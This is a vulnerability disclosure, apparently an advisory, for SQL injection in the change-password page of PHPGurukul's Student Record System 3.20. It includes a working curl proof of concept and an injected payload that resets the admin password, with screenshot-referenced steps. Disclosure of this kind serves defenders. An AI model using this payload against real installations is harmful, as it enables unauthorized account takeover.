
- Vendor : PHPGurukul
- Product : Student Record System Using PHP and MySQL
- Version : 3.20
- Official Website: https://phpgurukul.com/student-record-system-php/

Related Code file: change-password.php
Injection parameter: currentpassword, newpassword

## Vulnerability Description
The vulnerability is SQL Injection in Student Record System Using PHP and MySQL version 3.20
The currentpassword, newpassword parameters are vulnerable to SQL Injection when changing to a new password.
This vulnerability allows an attacker to inject a SQL query into the currentpassword, newpassword parameters to change the password of another user.
#### Impact Assessment 
This vulnerability allows an authenticated attacker to manipulate SQL queries during the password change process, potentially leading to:
- Unauthorized password changes for other user accounts

Affected Endpoint : http://127.0.0.1:8888/change-password.php
PoC : ```
```
curl -i -s -k -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "PHPSESSID=lg6rlbg3j0f1iaqfdvdvs9c4i3" \
    -d "currentpassword=' or id='1' -- -&newpassword=sqli' where id='1' -- -&confirmpassword=test&submit=Change" \
    "http://127.0.0.1:8888/change-password.php"
```

1. The account information for the current system looks like this:
   ![[1-pentest-20250829-0116.jpg]]

2. Login:
   ![[1-pentest-20250829-0110.jpg]]![[2-pentest-20250829-0110.jpg]]

3. Users can try to change the password:
   ![[1-pentest-20250829-0112.jpg]]

4. Intercept the traffic with burp suite and inject the SQL injection payload:
   `Payload: ' or id='1' -- -&newpassword=sqli' where id='1' -- -`
   ![[2-pentest-20250829-0112.jpg]]![[1-pentest-20250829-0120.jpg]]

5. The password for the admin account was changed to the string 'sqli'.   ![[1-pentest-20250829-0118.jpg]] 